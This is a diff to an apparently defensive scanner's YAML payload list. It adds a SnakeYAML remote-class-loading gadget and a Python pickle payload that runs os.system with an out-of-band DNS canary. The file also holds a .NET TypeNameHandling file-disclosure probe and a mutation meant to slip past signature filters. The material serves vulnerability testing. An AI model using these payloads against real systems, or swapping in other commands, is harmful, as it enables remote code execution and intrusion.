@@ -26,6 +26,14 @@ payloads:
     template: '{{"$type":"System.IO.FileInfo, mscorlib","data":"C:\\WINDOWS\\win.ini"}}'
     confidence: suspected
     notes: .NET TypeNameHandling deserialization type-swap probe for file disclosure.
+  - id: snakeyaml_marker
+    template: '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://{oast_host}/{canary}"]]]]'
+    confidence: suspected
+    notes: SnakeYAML unsafe-load gadget marker; loads a remote class via URLClassLoader, OAST callback confirms unsafe deserialization.
+  - id: python_pickle_reduce_marker
+    template: "(S'os'\\ni'system'\\np0\\n(S'nslookup {canary}.{oast_host}'\\ntp1\\nRp2\\n."
+    confidence: suspected
+    notes: Python pickle protocol-0 REDUCE marker invoking os.system with an OAST DNS canary; confirms unsafe pickle.loads without a destructive payload.
 mutations:
   - name: whitespace_alt
     description: Insert alternate whitespace inside gadget markers to bypass signature filters.
